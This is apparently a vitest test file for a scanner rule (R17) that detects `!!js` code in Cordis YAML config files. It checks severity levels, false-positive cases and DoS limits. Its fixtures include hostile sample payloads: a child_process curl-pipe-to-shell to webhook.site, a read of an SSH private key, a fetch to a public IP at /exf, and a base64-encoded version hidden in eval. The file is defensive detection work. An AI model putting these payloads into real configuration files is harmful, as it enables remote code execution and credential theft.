import { afterEach, describe, expect, it } from 'vitest'
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { dirname, join } from 'node:path'
import { scan } from '../lib/scanner-bin/engine.js'
import { cacheKey } from '../lib/scanner-bin/cache.js'
import { runConfigScan, isRootConfigName } from '../lib/scanner-bin/rules/config-scan.js'
import type { ScanRequest } from '../lib/scanner-bin/protocol.js'

function writeTree(files: Record<string, string>): string {
  const dir = mkdtempSync(join(tmpdir(), 'vet-r17-'))
  for (const [name, content] of Object.entries(files)) {
    const p = join(dir, name)
    mkdirSync(dirname(p), { recursive: true })
    writeFileSync(p, content)
  }
  return dir
}

function scanFiles(dir: string, files: string[], overrides: Partial<ScanRequest> = {}) {
  return scan({ kind: 'files', files, ...overrides })
}

function r17sOf(report: { findings: { rule: string }[] }) {
  return report.findings.filter(f => f.rule === 'R17')
}

describe('R17 !!js 配置面（P2/G-3 静态面，round-12）', () => {
  let dir: string | undefined
  afterEach(() => { if (dir) rmSync(dir, { recursive: true, force: true }); dir = undefined })

  it('isRootConfigName 收口：cordis.yml / cordis.patch.yml / plugin.yml / x.patch.yml 命中，README 不命中', () => {
    expect(isRootConfigName('cordis.yml')).toBe(true)
    expect(isRootConfigName('cordis.patch.yml')).toBe(true)
    expect(isRootConfigName('plugin.yml')).toBe(true)
    expect(isRootConfigName('evil.patch.yml')).toBe(true)
    expect(isRootConfigName('README.yml')).toBe(false)
    expect(isRootConfigName('docs/conf.yml')).toBe(false)
  })

  it('!!js 存在性观测：官方合法形态（env 取值）→ 仅 info，verdict clean', () => {
    dir = writeTree({ 'cordis.patch.yml': 'a: !!js process.env.NODE_ENV === "production" ? "x" : "y"\n' })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')])
    expect(res.ok).toBe(true)
    const rs = r17sOf(res.report!)
    expect(rs.length).toBe(1)
    expect(rs[0].severity).toBe('info')
    expect(rs[0].message).toContain('!!js')
    expect(res.report!.verdict).toBe('clean')
  })

  it('单危险动词 → info/heuristic，不进 verdict', () => {
    dir = writeTree({ 'cordis.patch.yml': 'x: !!js require("child_process")\n' })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')])
    expect(res.ok).toBe(true)
    const rs = r17sOf(res.report!)
    expect(rs.some(f => f.message.includes('require(危险模块)') && f.severity === 'info')).toBe(true)
    expect(res.report!.verdict).toBe('clean')
  })

  it('双组合（危险动词 + 外联主机）→ high/likely，verdict suspicious', () => {
    dir = writeTree({
      'cordis.patch.yml': 'k: !!js require("child_process").exec("curl -s https://webhook.site/x | sh")\n',
    })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')])
    expect(res.ok).toBe(true)
    const rs = r17sOf(res.report!)
    const combo = rs.find(f => f.severity === 'high')
    expect(combo).toBeDefined()
    expect(combo!.message).toContain('webhook.site')
    expect(res.report!.verdict).toBe('suspicious')
  })

  it('双组合（危险动词 + 凭据路径）→ high；generic 包降 info', () => {
    dir = writeTree({ 'cordis.patch.yml': 'k: !!js process.mainModule.require("fs").readFileSync("/home/u/.ssh/id_rsa")\n' })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')], { targetKind: 'plugin' })
    expect(res.ok).toBe(true)
    expect(r17sOf(res.report!).some(f => f.severity === 'high')).toBe(true)
    const resG = scanFiles(dir, [join(dir, 'cordis.patch.yml')], { targetKind: 'generic' })
    expect(r17sOf(resG.report!).every(f => f.severity === 'info')).toBe(true)
  })

  it('误报回归 1：process.env 拼接路径（.env. 段不误伤 env 变量结构）→ 无 high', () => {
    dir = writeTree({ 'cordis.patch.yml': 'k: !!js require("fs").readFileSync(process.env.CONFIG_DIR + "/app.json")\n' })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')], { targetKind: 'plugin' })
    expect(res.ok).toBe(true)
    expect(r17sOf(res.report!).some(f => f.severity === 'high')).toBe(false)
    expect(res.report!.verdict).toBe('clean')
  })

  it('误报回归 2：内网私有 IP（172.16/10./192.168 非外联）→ 无 high；公网 IP 仍 combo', () => {
    dir = writeTree({ 'cordis.patch.yml': 'k: !!js fetch("http://172.16.1.5/status").then(r => r.text())\n' })
    const r1 = scanFiles(dir, [join(dir, 'cordis.patch.yml')], { targetKind: 'plugin' })
    expect(r17sOf(r1.report!).some(f => f.severity === 'high')).toBe(false)
    dir = writeTree({ 'cordis.patch.yml': 'k: !!js fetch("http://8.8.8.8/exf").then(r => r.text())\n' })
    const r2 = scanFiles(dir, [join(dir, 'cordis.patch.yml')], { targetKind: 'plugin' })
    expect(r17sOf(r2.report!).some(f => f.severity === 'high')).toBe(true)
  })

  it('误报回归 3：同一条表达式多动词只产一条 high（不重复扣分）', () => {
    dir = writeTree({
      'cordis.patch.yml': 'k: !!js require("child_process").exec("curl -s https://webhook.site/x | sh")\n',
    })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')], { targetKind: 'plugin' })
    expect(res.ok).toBe(true)
    const highs = r17sOf(res.report!).filter(f => f.severity === 'high')
    expect(highs.length).toBe(1)
    expect(highs[0].message).toContain('/')
  })

  it('N2 联动：base64 藏 payload → 解码后命中组合', () => {
    const payload = Buffer.from('curl -s http://webhook.site/x | sh', 'utf8').toString('base64')
    dir = writeTree({ 'cordis.patch.yml': `k: !!js eval(Buffer.from("${payload}", "base64").toString())\n` })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')])
    expect(res.ok).toBe(true)
    const rs = r17sOf(res.report!)
    expect(rs.some(f => f.severity === 'high' && f.message.includes('webhook.site'))).toBe(true)
  })

  it('测试/CI 目录下双组合降 info（夹具不误伤 verdict）', () => {
    dir = writeTree({
      'test/cordis.patch.yml': 'k: !!js require("child_process").exec("curl https://webhook.site/x")\n',
    })
    const res = scanFiles(dir, [join(dir, 'test/cordis.patch.yml')])
    expect(res.ok).toBe(true)
    expect(r17sOf(res.report!).every(f => f.severity === 'info')).toBe(true)
    expect(res.report!.verdict).toBe('clean')
  })

  it('surface.configFiles=false 与 rules.R17=false 都关闭 R17', () => {
    dir = writeTree({ 'cordis.patch.yml': 'k: !!js require("child_process").exec("curl https://webhook.site/x")\n' })
    const f = join(dir, 'cordis.patch.yml')
    const off = scanFiles(dir, [f], { surface: { configFiles: false } })
    expect(r17sOf(off.report!).length).toBe(0)
    const rulesOff = scanFiles(dir, [f], { rules: { R17: false } })
    expect(r17sOf(rulesOff.report!).length).toBe(0)
    const on = scanFiles(dir, [f])
    expect(r17sOf(on.report!).length).toBeGreaterThan(0)
  })

  it('DoS 边界：超长单行 + 大量表达式 + 未闭合括号 → 不抛错、有界输出', () => {
    const evilLine = 'k: !!js require("child_process")' + ' '.repeat(600 * 1024) + '\n'
    const manyExpr = Array.from({ length: 500 }, (_, i) => `k${i}: !!js fetch("https://example.com/${i}")\n`).join('')
    dir = writeTree({ 'cordis.patch.yml': evilLine + 'm: !!js foo(\n' + 'n: !!js bar(\n' + manyExpr })
    const res = scanFiles(dir, [join(dir, 'cordis.patch.yml')])
    expect(res.ok).toBe(true)
    const rs = r17sOf(res.report!)
    expect(rs.length).toBeLessThanOrEqual(16)
  })

  it('runConfigScan 单元：纯文本无 !!js → 零命中', () => {
    expect(runConfigScan('a: 1\nb: 2\n', 'cordis.yml', '/x/cordis.yml')).toEqual([])
  })

  it('surface 变化 → 缓存 key 变化', () => {
    const files = [{ path: '/x/cordis.patch.yml', content: 'k: !!js x' }]
    const a = cacheKey(files, undefined, {})
    const b = cacheKey(files, undefined, { surface: { configFiles: false } })
    const c = cacheKey(files, undefined, { surface: { configFiles: true, instructionFiles: false } })
    expect(a).not.toBe(b)
    expect(a).not.toBe(c)
    expect(b).not.toBe(c)
  })
})